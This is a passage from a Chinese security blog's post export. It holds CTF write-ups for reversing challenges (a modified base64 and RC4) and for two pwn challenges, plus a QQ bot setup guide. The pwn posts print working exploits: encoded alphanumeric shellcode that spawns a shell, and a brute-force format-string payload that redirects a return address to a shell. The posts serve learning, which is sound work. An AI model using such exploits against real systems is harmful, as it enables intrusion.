1); v7 += 3; second = *(_BYTE *)(v7 - 3); v5[v6] = (first &gt;&gt; 2) + 32; v5[v6 + 1] = ((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3); v10 = thired &gt;&gt; 6; v5[v6 + 3] = (thired &amp; 0x3F) + 32; v5[v6 + 2] = (v10 | 4 * (second &amp; 0xF)) + 32; v6 += 4;&#125;while ( v6 &lt; v15 );不过还是有两点非常细节的地方!首先，获取到索引的时候，进行了 +32 的操作其次，v5[v6+1]也就是每组(每四个一组)索引中的第二个索引与每组中的其他三个索引不同。其他三个索引，是按照base64_encode算法求出以后再进行+32操作但第二个索引v5[v6 + 1] = ((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3);是取了每组(每三个一组)待加密字符串中第二个字符的前四位加上32以后与16 * (first &amp; 3)进行或运算。而并非按照base64_encode原本的算法先求出(second &gt;&gt; 4) | 16 * (first &amp; 3) ，然后再按照程序的意愿进行+32隐含的问题这样就会导致一个问题:说白了就是由于这个程序进行的是((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)操作，导致每组索引中的第二个索引从左向右第三位(算上为了补齐8位而在开头补的2个0)总会是1。因此在逆这个算法的时候需要对其分情况讨论，讨论还原真正的IndexString的时候是否需要减去32下面举两种情况来说明：情况一假设我们待加密的字符串为Gwn其二进制表示为01000111 01110111 01101110用first表示第一个字符，用second表示第二个字符。((second &gt;&gt; 4) + 32) == 10011116 * (first &amp; 3) == 110000((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3) == 110111而((second &gt;&gt; 4)) == 00011116 * (first &amp; 3) == 110000((second &gt;&gt; 4)) | 16 * (first &amp; 3) == 110111通过上述可以发现，如果每组待加密字符串的第一个字符的从左往右第7位为1，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为1那么就有((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)就等于((second &gt;&gt; 4)) | 16 * (first &amp; 3)情况二但如果我们待加密的字符串为Ewn呢?其二进制表示为01000101 01110111 01101110用first表示第一个字符，用second表示第二个字符。((second &gt;&gt; 4) + 32) == 10011116 * (first &amp; 3) == 010000((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3) == 110111而((second &gt;&gt; 4)) == 00011116 * (first &amp; 3) == 010000((second &gt;&gt; 4)) | 16 * (first &amp; 3) == 010111 == (((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3))-32也就是说如果每组待加密字符串的第一个字符的从左往右第7位为0，也就是获取的每组索引中的第二个索引的从左往右第3位(因为前2位要补0形成8位byte类型)为0那么就有((second &gt;&gt; 4) + 32) | 16 * (first &amp; 3)就等于(((second &gt;&gt; 4)) | 16 * (first &amp; 3)) + 320x02 思路由程序用于对比的字符串8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]想办法还原出真正的IndexString,这里可以考虑爆破,毕竟真正需要爆破的是每组(每四个一组)中的第二个索引中的从左向右第3位(按总共8位来算)，这个字符串长度32，需要爆破8个位置，每个位置2种情况，最多需要爆破2的8次方即256次。爆破成功与否需要看能否正常解密得到flag。还原出真正的IndexString以后，也就得到了正确的索引，也就可以根据索引按照真正的base64加密算法得到一个base64串，然后进行base64decode，就得到了我们input进行程序的changed_base64_encode后的结果。然后对这个结果进行base64换表decode即可得到flag。0x03 解密脚本比较菜，目前只想出了用随机数进行爆破和直接套8次for循环的爆破，8次for循环太麻烦了，这里用的随机数。应该还有更好的爆破方法吧123456789101112131415161718192021222324# -*- coding: UTF-8 -*-import base64import stringimport randoms = '8&amp;]Z:&amp;)&amp;=%$T+3%4,6PU:#1M544Q5$,]'base_table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'changed_base_table = \"OPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN\"while True: try: tmp = '' for i in range(0,len(s),4): tmp += base_table[(ord(s[i])-32)] rand = random.choice([0, 32]) tmp += base_table[(ord(s[i+1])-rand)] tmp += base_table[(ord(s[i+2])-32)] tmp += base_table[(ord(s[i+3])-32)] base = tmp.decode('base64') flag = base64.b64decode(base.translate(string.maketrans(changed_base_table, base_table))) if flag[0:5] == 'flag&#123;' and flag[-1] == '&#125;': print '[+] Get flag! flag = ' + flag except: continue爆破的话能爆破出来好几种解，比如:1234flag&#123;BAsE&gt;4aBB64&#125;flag&#123;BAsE&gt;4_BB64&#125;flag&#123;BAsE64aBB64&#125;flag&#123;BAsE64_BB64&#125;经过测试，这些都能通过程序的验证。0x04 写在最后主办方在群里发过一段解密脚本，但是程序strcmp的那个字符串与这个程序有些许差别。大概这个程序是经过改编的，而且我感觉上面分析的那个+32的问题，应该是改编时没注意括号导致的?不过这道题目还是挺有意思的，考察对base64算法的具体理解，单单会用Python或者其他语言里面现有的encode与decode还是不够的。如果有人看到了这篇博客并且想到了更好的爆破方法，希望能够教教弟弟。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"忽略细节导致耗时较多的一道逆向题Babyalgo","slug":"忽略细节导致耗时较多的一道逆向题Babyalgo","date":"2020-11-19T10:14:31.000Z","updated":"2020-11-19T11:01:56.279Z","comments":true,"path":"2020/11/19/忽略细节导致耗时较多的一道逆向题Babyalgo/","link":"","permalink":"http://liul14n.top/2020/11/19/忽略细节导致耗时较多的一道逆向题Babyalgo/","excerpt":"","text":"0x00 前言早闻Nu1L出了一本《从0到1：CTFer成长之路》今天逛BUU的时候发现多了一栏N1BOOK点开做一下，发现第二题竟然被卡住了，输出的flag后面有不可见字符而且后五六个字符似乎没啥含义折腾挺大一会才发现原来是因为忽略了一个细节…耗时比我想象中的多，就当吸取不仔细的教训吧…0x01 分析来到main函数，可以看到程序定义了一个数组但是这里有一个导致我后期输出的flag一直有问题的细节可以看到…前一个还是[rbp+var_2A]，下一个就变成了[rbp+var_28]，也就是说[rbp+var_29]不见了…后期我还纳闷…明明flag要求长度45,但为什么这个数组只有44长度…然后自己在最后补了个0…根据常识可知[rbp+var_29] = 0继续分析，进行了一番变量、函数重命名以后得到如下反汇编结果这是后来才知道的这个函数是RC4算法函数……由于第一次见这个算法的时候没想起来这是RC4，我直接去看相关算法然后逆的进去看看RC4函数123456789101112__int64 __fastcall RC4(__int64 a1, __int64 input, __int64 a3)&#123; __int64 v3; // ST08_8 char v5; // [rsp+20h] [rbp-110h] unsigned __int64 v6; // [rsp+128h] [rbp-8h] v3 = a3; v6 = __readfsqword(0x28u); sub_40067A((const char *)a1, (__int64)&amp;v5); sub_400753((__int64)&amp;v5, (const char *)input, v3); return 0LL;&#125;根据sub_40067A((const char *)a1, (__int64)&amp;v5);所传入的参数可以知道，这是一个与我们输入的flag无关的函数。具体分析了一下可以知道它的作用是根据main函数中的key去得到一个数组v5。显然可以通过gdb调试(简便)或者自己写个算法(较麻烦,因为如果用python写，还要处理一些数据类型如unsigned int/unsigned __int8等的问题)得到这个数组v5。得到的v5会传给sub_400753((__int64)&amp;v5, (const char *)input, v3);函数。其作用是生成校验数组v3，也就是a3，也就是RC4的第三个参数RC4output，然后去与main函数中生成的数组进行对比校验，具体操作是通过一个数与我们的输入进行异或。分析一下，上一句中谈到的”一个数”，是与输入的flag无关的，即无论输入什么flag，只要满足flag.length == 45,在while循环中每次异或时循环次数相同时这个数都是固定不变的，那么可以将这些数(对应xor那句下断,它存在rdx中)提取出来作为一个数组，直接与main函数中的数组异或，便可得到flag。0x02 思路思路一由于sub_40067A生成v5数组的过程是与输入无关的,那么可以通过gdb调试或者算法等方法生成v5，然后模拟sub_400753的逆过程生成flag。思路二根据上面的分析，可以将sub_400753中与input[i]异或的那个数提取出来作为数组，与main函数的数组异或即可生成flag。思路三后来才知道这个是RC4算法，有了密文(main数组即可转换为密文)和key(Nu1Lctf233)，即可生成明文flag。不过网上各个RC4算法好像不太一致，在线网站生成结果也不太一样……最终找到了一个能用的算法。0x03 解密脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110# -*- coding: UTF-8 -*-'''根据IDA的显示结果,得到的L是这样的。L = [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31, 0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee, 0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d, 0x71,0x55,0x08,0x07,0xb2,0xa8,0x2f,0xf4, 0x51,0x8e,0x0c,0xcc,0x33,0x53,0x31,0x40, 0xd6,0xca,0xec,0xd4,0x00] #最后的0x00单纯是我为了凑够长度而补的...很可惜这不对,原因在于.text:00000000004009B1 mov [rbp+var_2D], 0CCh.text:00000000004009B5 mov [rbp+var_2C], 33h.text:00000000004009B9 mov [rbp+var_2B], 53h.text:00000000004009BD mov [rbp+var_2A], 31h #注意这里, 下一行直接是var_28,少了var_29.text:00000000004009C1 mov [rbp+var_28], 40h #也即默认[rbp+var_29] = 0,并且以下都有一位移位.text:00000000004009C5 mov [rbp+var_27], 0D6h.text:00000000004009C9 mov [rbp+var_26], 0CAh通过gdb调试或者正确分析了以后可以知道真正的L是这样的'''L = [0xc6,0x21,0xca,0xbf,0x51,0x43,0x37,0x31, 0x75,0xe4,0x8e,0xc0,0x54,0x6f,0x8f,0xee, 0xf8,0x5a,0xa2,0xc1,0xeb,0xa5,0x34,0x6d, 0x71,0x55,0x08,0x07,0xb2,0xa8,0x2f,0xf4, 0x51,0x8e,0x0c,0xcc,0x33,0x53,0x31,0x00, 0x40,0xd6,0xca,0xec,0xd4,]'''思路1:似乎略微麻烦一些gdb调试拿到sub_40067A的结果的第二个参数,即下方s然后模拟执行sub_400753其中异或过程为逆向过程'''s = '0x4e 0xc4 0xf7 0x68 0x09 0x26 0x08 0x0e 0x92 0x2d 0x9a 0x1a 0x64 0xb0 0x21 0xa4 0x0b 0x5d 0xa2 0x22 0x4a 0xd4 0x1b 0x7e 0xfb 0x76 0x80 0x55 0x32 0x27 0x4f 0x1d 0xf8 0x8e 0x88 0x0f 0x5a 0x69 0xe6 0xb4 0x2f 0x9c 0x8c 0x89 0x36 0x11 0x38 0x8d 0x25 0xe7 0xcd 0x42 0x87 0xdf 0x78 0x4c 0x5f 0x9f 0x99 0xa3 0xcf 0xa1 0xb2 0xd0 0x9b 0x47 0x6a 0xd1 0xbc 0x5e 0x85 0x13 0x59 0x1e 0xc6 0x2c 0x52 0xb6 0x4b 0x65 0x2b 0x40 0xaa 0xeb 0x96 0x75 0x41 0x49 0xf0 0x10 0x6d 0xf4 0x81 0xde 0x0c 0xab 0x0d 0x5b 0xc3 0xd2 0xe5 0x90 0xc0 0x66 0x29 0x01 0x94 0x44 0x48 0x20 0x57 0x98 0x61 0x83 0x8f 0x15 0xae 0x28 0xef 0xa8 0x39 0xd7 0xc5 0x2a 0xba 0xec 0x4d 0x93 0x79 0xa9 0xfc 0xe9 0xbb 0xbd 0xaf 0x45 0xe8 0xdd 0x0a 0xdc 0x04 0xc8 0xca 0xe2 0xd5 0xb9 0x03 0x00 0xad 0xa7 0x8a 0x6c 0x58 0xf5 0xee 0x30 0xff 0xbe 0x7f 0x19 0x56 0x54 0xc2 0xf3 0x72 0xbf 0x63 0x17 0xfa 0x9d 0x77 0xd3 0x91 0x14 0x35 0x7d 0x18 0xb7 0x23 0x8b 0xa0 0xda 0x05 0x7b 0xe1 0x7a 0xa6 0x62 0x71 0xcc 0xd8 0x6b 0x9e 0xf6 0x3f 0x1f 0xb3 0x2e 0x5c 0x12 0x1c 0x3a 0x6f 0x73 0xf1 0x67 0xcb 0xac 0x3e 0x07 0x74 0xc1 0x86 0x51 0xc7 0x82 0xce 0x43 0xe4 0xe3 0xed 0x53 0x33 0x16 0xb5 0x06 0x37 0xdb 0xc9 0xf2 0x84 0x50 0x95 0xa5 0xd6 0x46 0xb8 0xfd 0x70 0x60 0x24 0x97 0x6e 0xb1 0x3c 0x02 0xea 0x3b 0x34 0xfe 0xd9 0xf9 0x7c 0xe0 0x3d 0x31'Li = s.split('\\t')v5 = []for i in Li: v5.append(int(i,16))v6 = 0v7 = 0v8 = 0flag = ''#这是模拟sub_400753,其中异或为逆向过程for i in range(45): v6 = ((((((v6+1)&gt;&gt;31)&amp;0xffffffff)&gt;&gt;24) + v6 + 1)&amp;0xff) - ((((v6+1)&gt;&gt;31)&amp;0xffffffff)&gt;&gt;24) v3 = (((v7+(v5[v6]&amp;0xff))&gt;&gt;31)&amp;0xffffffff)&gt;&gt;24 v7 = (v3+v7 + v5[v6])&amp;0xff - v3 v5[v6],v5[v7] = v5[v7],v5[v6] tmp = v5[((v5[v6] + v5[v7])&amp;0xff)]&amp;0xff flag += chr(L[i]^tmp)print flag'''思路2:由于不论输入的flag是什么,只要满足输入长度=45,在sub_400753中input[i] ^ 某个数中这个某个数都是不变的固可以通过gdb调试，下断，依次读取其值(存在edx中),就能得到一个数组,然后去与我们的L进行异或即可得到flag得到的数组如下:这个方法算是思路1的进阶版吧,虽然也有点麻烦,但是对于应对一些算法比较晦涩难懂的情况还是很好用的(当然这个题算法....emmmm做完才知道是RC4....可以直接解密)'''ano = [0xa8,0x10,0xa8,0xd0,0x3e,0x28,0x4c,0x44, 0x06,0xd5,0xe0,0x87,0x0b,0x09,0xbc,0x8f, 0x8c,0x2f,0xd0,0xf2,0x98,0xfa,0x03,0x02, 0x2e,0x31,0x6d,0x30,0xd7,0xda,0x42,0xc5, 0x3f,0xbd,0x53,0xf8,0x5f,0x34,0x01,0x72, 0x29,0xe1,0xa2,0x81,0xa9]flag = ''for i in range(len(ano)): flag += chr(ano[i]^L[i])print flag'''思路3:直接利用RC4解密'''from Crypto.Cipher import ARC4 as rc4cipherimport base64def rc4_algorithm(encrypt_or_decrypt, data, key1): if encrypt_or_decrypt == \"encrypt\": key = bytes(key1) enc = rc4cipher.new(key) res = enc.encrypt(data.encode('utf-8')) res=base64.b64encode(res) res = str(res) return res elif encrypt_or_decrypt == \"decrypt\": data = base64.b64decode(data) key = bytes(key1) enc = rc4cipher.new(key) res = enc.decrypt(data) res = str(res) return reskey = 'Nu1Lctf233'text = ''for i in L: text += chr(i)res = base64.b64encode(text)print rc4_algorithm('decrypt', res, key)0x04 总结细节很重要。熟记各种常见算法会对逆向很有帮助。","categories":[{"name":"逆向","slug":"逆向","permalink":"http://liul14n.top/categories/逆向/"}],"tags":[]},{"title":"mrctf2020_shellcode_revenge","slug":"mrctf2020-shellcode-revenge","date":"2020-09-23T08:43:42.000Z","updated":"2020-09-23T09:05:53.490Z","comments":true,"path":"2020/09/23/mrctf2020-shellcode-revenge/","link":"","permalink":"http://liul14n.top/2020/09/23/mrctf2020-shellcode-revenge/","excerpt":"","text":"0x00 前言刷到一道shellcode受限制的题目，自己尝试写shellcode，试了半天不行，最后查阅WP了解到有相关工具…..特地记录一下0x01 程序分析123456Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX disabledPIE: PIE enabledRWX: Has RWX segments由于0x124D处的call指令导致F5反编译失败。只能看汇编了。根据汇编大概写出伪代码12345678输出 \"Show me your magic!\"读取 0x400个字节到buf,buf位于栈, rbp - 0x410遍历buf[i]if(buf[i]不属于0x30~0x5a 或者 0x61~0x7a)&#123; 输出 \"I Can't Read This!\"&#125;else&#123; 执行buf();&#125;而且NX保护没开，所以向buf写入符合要求的shellcode即可。0x02 Do it!查阅一番资料以后找到一篇非常不错的文章，虽然没能让我解出这道题目，但是从中学到不少姿势。Shellcode的艺术去尝试了使用shellcode_encoder生成符合要求的shellcode，结果生成的shellcode里面依然含有不在题目要求范围内的字符。123456789Python 2.7.12 (default, Jul 21 2020, 15:19:50) [GCC 5.4.0 20160609] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; from pwn import *&gt;&gt;&gt; context(arch = 'amd64', os = 'linux', log_level = 'debug')&gt;&gt;&gt; f = open('shellcode_x64','wb')&gt;&gt;&gt; sc = asm(shellcraft.sh())&gt;&gt;&gt; f.write(sc)&gt;&gt;&gt; f.close()1234567891011121314151617181920212223242526$ python main.py shellcode_x64 raxEncoding stage2488b0432 =&gt; 4863343a31343a53582d692b6c722d21265870353e253f2f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f480faf44 =&gt; 4863343a31343a53582d394f4f642d515f2020353e5e3f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f32084889 =&gt; 4863343a31343a53582d576068292d482020203553773f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f043a83c7 =&gt; 4863343a31343a53582d515a23232d7c40204035375f3f5b505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f0883c610 =&gt; 4863343a31343a53582d692b46722d5c20205e3533375f3f505e31343a57582d5f5e2f3f2d3d6170442d6040607c505f85c075e8 =&gt; 4863343a31343a53582d202075492d21406020353a5f5f7e505e31343a57582d5f5e2f3f2d3d6170442d6040607c505fMultiply-encoding stage36a6848b82f62696e =&gt; 213339282e64403b 2a657a302621346e2f2f2f73504889e7 =&gt; 5f376c7274346e40 312a7d7e773c3f7d6872690101813424 =&gt; 58392e3534337d6e 6724682e6a3767340101010131f6566a =&gt; 775f695a3f256f51 47717c7b22375725085e4801e6564889 =&gt; 3738773f73217c4e 387e3f4442232a4de631d26a3b580f05 =&gt; 413c7a24335b502e 6630522a7a37217cAssembling jump at +408Encoding preamble for rdx &lt;- raxPZOriginal length: 48Encoded length: 508Preamble length: 2Total length: 510PZTAYAXVI31VXPP[_Hc4:14:SX-i+lr-!&amp;Xp5&gt;%?/P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-9OOd-Q_ 5&gt;^??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-W`h)-H 5Sw??P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-QZ##-|@ @57_?[P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX-i+Fr-\\ ^537_?P^14:WX-_^/?-=apD-`@`|P_Hc4:14:SX- uI-!@` 5:__~P^14:WX-_^/?-=apD-`@`|P_SX-\"A`B-#`@~5#__?P_Hc4:14:SX- A $-3 5R|/+P^14:WX-_^/?-=apD-`@`|P_SX-@Ebi- \\`Y5&lt;_==P^SX-_A1\"-q@_~5(~o_P_AAAA!39(.d@;*ez0&amp;!4n_7lrt4n@1*&#125;~w&lt;?&#125;X9.543&#125;ng$h.j7g4w_iZ?%oQGq|&#123;\"7W%78w?s!|N8~?DB#*MA&lt;z$3[P.f0R*z7!|最后了解到使用alpha3可以生成指定要求的shellcode，rax表示指向shellcode的寄存器(这道题是call rax，也就意味着rax是指向shellcode的)1234$ python ALPHA3.py x64 ascii mixedcase rax --input='shellcode_x64' &gt; x64_out$ cat x64_out Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t…然后send(shellcode)就行了…0x03 完整EXP1234567891011121314151617from pwn import *context(arch = 'amd64', os = 'linux', log_level = 'debug')c = process('./pwn')#c = remote('node3.buuoj.cn',25514)#gdb.attach(c,'b * $rebase(0x124D)')f = open('x64_out','rb')sc = f.read()f.close()c.recvuntil('magic!\\n')c.send(sc)c.interactive()","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"xman_2019_format(堆上格式化字符串)","slug":"xman-2019-format-堆上格式化字符串","date":"2020-09-18T08:54:26.000Z","updated":"2020-09-18T09:42:44.782Z","comments":true,"path":"2020/09/18/xman-2019-format-堆上格式化字符串/","link":"","permalink":"http://liul14n.top/2020/09/18/xman-2019-format-堆上格式化字符串/","excerpt":"","text":"0x00 前言曾经也遇到过堆上格式化字符串漏洞类型的题目，但是咕了许久以后再次遇到这种类型的题目，捣鼓半天而且借助WP才搞出来……特此写篇博客记录一下以加深印象。题目在BUUCTF上可以找到.0x01 程序分析12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000)buf不在栈上，而是通过malloc申请的12buf = malloc(0x100u);read(0, buf, 0x37u);然后将buf作为参数，进入sub_80485C4函数内，该函数存在格式化字符串漏洞，不过只能单次利用。1234567891011121314151617char *__cdecl sub_80485C4(char *s)&#123; char *v1; // eax char *result; // eax puts(\"...\"); v1 = strtok(s, \"|\");//相当于split(s,\"|\") printf(v1); while ( 1 ) &#123; result = strtok(0, \"|\"); if ( !result ) break; printf(result); &#125; return result;&#125;程序存在后门函数123456789101112.text:080485AB ; __unwind &#123;.text:080485AB push ebp.text:080485AC mov ebp, esp.text:080485AE sub esp, 8.text:080485B1 sub esp, 0Ch.text:080485B4 push offset command ; &quot;/bin/sh&quot;.text:080485B9 call _system.text:080485BE add esp, 10h.text:080485C1 nop.text:080485C2 leave.text:080485C3 retn.text:0804850x02 重点与思路利用格式化字符串漏洞将返回地址改为后门函数一条重点对于%ac$xn，其中a为个数，x是偏移，如果此处地址里面存放的依旧是个指针(地址)，那么会向里面存放的指针所指向的地方写入数据。即 A-&gt;B-&gt;C,A和B都是地址，则最后数据会写到C处。稍作调试在第一个printf(0x080485F6)的位置下断点，运行，然后查看栈。可以看到这两处是可以作为跳板的ebp位置的位于偏移0xa处，下面的位于偏移0x12处不过即便每次运行的时候栈地址都会变动，但是偏移0x13处的最后一位总会是c，比如会是0c、1c、2c…..ec、fc。这便为我们爆破提供的条件。确定思路以图为例，如果我们利用那条重点对偏移0xa处进行写入则数据会写到如图0xffe5a238处(即修改0xffe5a238为其他值)那么如果将0xffe5a238修改为0xffe5a20c那么偏移0x12处也便指向了0xffe5a20c偏移0x12处将变成: 0xffe5a208 -&gt; 0xffe5a20c -&gt; 0x8048697的形式。(如果问为什么没有图，那是因为手残把gdb给关了…. 地址每次都是随机的，还原不回上图的值了，为了不让读者因地址变动而产生疑惑，只能用文字表示了。)那么我们可以通过格式化字符串和那条重点对偏移0x12处进行写入，即修改0x8048697的值为后门函数地址。因为栈地址是随机的，所以采用爆破。0x03 完整EXP1234567891011121314151617181920212223242526272829303132#coding:utf-8from pwn import *from LibcSearcher import *context(arch = 'i386', os = 'linux', log_level = 'debug')while True: c = process('./fmt') #c = remote('node3.buuoj.cn',26254) elf = ELF('./fmt') backdoor = 0x080485ab #gdb.attach(c,'b * 0x080485F6') c.recvuntil('...\\n') c.recvuntil('...\\n') payload = '%12c%10$hhn' #使偏移0x12处栈指向0x13偏移处(看运气,概率理论上是1/16)，这里可以选12(0x0c)也可以选0x1c、0x2c...0xfc都可以，反正都要爆破的... payload += '|%34219c%18$hn' #修改返回地址为后门函数，因为只有后两字节不同，所以是$hn。 #如果看懂了前面的重点与思路，理解payload应该是挺容易的。关键还是A-&gt;B-&gt;C,AB均为地址,数据会写到C处这条性质。 c.send(payload) c.recvuntil('...') c.recvuntil('...') try: c.sendline('echo aaaa') c.recvuntil('aaaa',timeout = 1) c.interactive() except: c.close() continue0x04 参考链接语雀","categories":[{"name":"Pwn","slug":"Pwn","permalink":"http://liul14n.top/categories/Pwn/"}],"tags":[]},{"title":"打造属于自己的QQ群机器人(已失效)","slug":"打造属于自己的QQ群机器人(已失效)","date":"2020-07-11T15:56:35.000Z","updated":"2020-12-22T08:52:08.977Z","comments":true,"path":"2020/07/11/打造属于自己的QQ群机器人(已失效)/","link":"","permalink":"http://liul14n.top/2020/07/11/打造属于自己的QQ群机器人(已失效)/","excerpt":"","text":"0x00 前言8月4号最新更新:最近没鼓捣Q群机器人，也没在意它的运行情况，今天鼓捣了一下发现连不上酷Q接口…百度了一下，原来是腾讯为了推广自己的机器人，封杀了其他第三方机器人。。。酷Q也不幸遇难。唉！最近对机器人产生了挺大的兴趣(主要因为两部galgame)，偶然间也在一个QQ群里看到一个较为智能的机器人，所以我也想拥有一个QQ机器人，也就有了这篇博文。#ATRI天下第一![宇宙没有永恒的事物，所以哀叹事物的终结也毫无意义，在迎来终结之前，怎样度过这段时间才是最重要的]0x01 信息搜集一番Google以后得知，由于QQ的消息都是会经过加密的，所以除非搞清楚QQ的某些协议和加密算法，不然自己去实现获取QQ的消息是有很大难度的。又得知目前的QQ机器人大部分都是用一款名为酷Q的软件来实现的，主要是因为它通过神奇的方式搞清楚了QQ的协议。在网页QQ(webqq，于19年3月去世)还在世的时候，它采用的是webqq协议，据说比较容易获取和发送消息。而现在QQ采用的是smartqq协议，具体是怎样的我也不清楚，或者说即便知道了也很难理解。既然存在有酷Q这个软件，那么就可以利用这个软件当做一个跳板来制作属于自己的机器人了。目前的酷Q有 酷Q air、酷Q pro。air版本目前免费，但是相对应的，功能就比pro少，比如一些发图片、发语音的功能就需要pro版才可以实现。酷Q可以在Mac、Linux、Windows平台上运行，在Windows上主要是运行其exe文件，而在Mac和Linux上，则可以用docker的形式来运行酷Q，这也就意味着，酷Q可以挂到服务器上24小时运行。酷Q有它自己的社区，在社区里面可以下载到各种酷Q使用者自己开发的插件，当然有些高质量插件也是要收费的，不过还是免费、开源的插件居多。0x02 安装酷Q由于我打算把酷Q挂到服务器上，所以这里我下载的docker版本。由于酷Q docker还是挺大的，我用docker的默认镜像下了许久也才下载了一小部分，所以这里先用一下docker的加速器。使用docker镜像加速器可以选用的加速器有网易的、阿里云的、七牛云的 等等等等…12345网易：https://hub-mirror.c.163.com/阿里云：https://&lt;你的ID&gt;.mirror.aliyuncs.com七牛云加速器：https://reg-mirror.qiniu.com阿里云镜像加速地址获取到加速器地址以后修改配置文件。1vi /etc/docker/daemon.json这里以使用网易加速器为例12345678sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'&#123; \"registry-mirrors\": [\"https://hub-mirror.c.163.com/\"]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker保存退出重启docker服务1service docker restart拉取并安装酷Q docker1docker pull coolq/wine-coolq #拉取酷Qdocker,时间可能会久一些拉取成功以后输入docker images可以看到coolq/wine-coolq的实例1mkdir /root/coolq-data # 任意路径均可,创建一个文件夹用于存放酷Q数据然后运行酷Q镜像，由于要安装到服务器上，所以选择后台运行的方式。1docker run --name=coolq -d -p 8080:9000 -p 5700:5700 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=123456 coolq/wine-coolq参数作用-p 8080:9000把8080改到任意端口，用于使用浏览器连接docker的桌面-p 5700:5700把前一个5700改成任意端口，用于连接酷Q的HTTP API-v /root/coolq-data改成之前新建的文件夹，用于做文件夹储存位置的映射VNC_PASSWD=12345678可以自己设置密码，用于连接docker的远程桌面COOLQ_ACCOUNT=123456登录的机器人的QQ号运行命令以后，当看到[CQDaemon] Started CoolQ即为运行成功。这时候访问http://你的服务器IP:你的端口即可看到noVNC登陆，输入刚刚设置的VNC密码即可登陆VNC看到docker远程桌面。如果访问不成功的话, 可以看后面的 0x04常见问题:然后就是登陆你的机器人QQ了待会可能会出现这个提示选择拒绝本次网页验证即可登上以后可以看到自己机器人QQ的头像，会以悬浮窗的形式出现。右键悬浮窗以后就会有各种功能，悬浮窗默认显示消息速度，也可以自行设置显示什么。如果不小心把这个显示悬浮窗的对勾给勾掉的话，也可以通过右键点击这个蓝色的圈来替代悬浮窗。0x03 安装插件社区里面下载到的插件大都是cpk文件。将下载到的插件存放于/coolq/app/文件夹内即可。我尝试了一下自带的图灵机器人插件，对话什么的体验都挺棒，可惜只能免费体验3天。安装CQHTTP核心插件有一个插件名为CQHTTP，这应该算是一个核心插件吧，有了它就可以自己开发各种插件了，它提供较为全面的API，包括私聊、群聊、加好友、群踢人、群禁言等等等等…CQHTTP下载地址将其放到/coolq/app/文件夹以后来到docker远程桌面进行启用。右键悬浮窗-应用管理-找到HTTP API-启用。启用以后会在/coolq/data/app/io.github.richardchien.coolqhttpapi/config/文件夹内生成你登陆的QQ号.json文件。编辑该文件，在&quot;post_url&quot;一项后面填入http://127.0.0.1:你前面设置的HTTP API的端口(默认5700)。以我前面设置的 -p 5700:5700为例，那么我填好后的形式应该为&quot;post_url&quot;: &quot;http://127.0.0.1:5700&quot;填好以后保存退出。其API文档如下:HTTP API文档可以写个py脚本测试一下。123456789101112#coding:utf-8import requestsdata = &#123; 'user_id':1125214419, 'message':'hhhhh', 'auto_escape':False&#125;api_url = 'http://127.0.0.1:5700/send_private_msg'print requests.post(api_url,data)发现返回&lt;Response [200]&gt;,而且我的大号收到了来自QQ机器人的hhhhh消息，这个应该是需要加了好友才行。其他API也可以自行测试。不过发群聊有可能会因为刚挂到服务器，算是异地登录而失败，即便返回的也是200状态码，但依然收不到消息。其他插件粗略逛了逛社区，发现几个还是挺不错的免费插件smile娱乐 插件PIXIV查询关注早晚安还有挺多宠物系统、还有一些游戏系统，自行发现吧。0x04 常见问题浏览器中访问docker远程桌面失败问题描述:访问http://你的服务器IP:你的端口失败，但是通过localhost是可以正常访问的问题解决方案:由于通过localhost可以正常访问，说明不是部署问题，那么考虑到应该是服务器的端口是禁止访问的。以阿里云服务器为例:可以在控制台打开对应端口，具体操作看下面参考链接参考链接安装好的插件在docker远程桌面显示不全问题描述:安装好的插件，在docker远程桌面显示不全，总是缺右侧的一部分，导致许多插件无法正常使用(无法按到如 保存配置 等按钮)，把插件往左拖拽依然显示不全。比如 smile娱乐 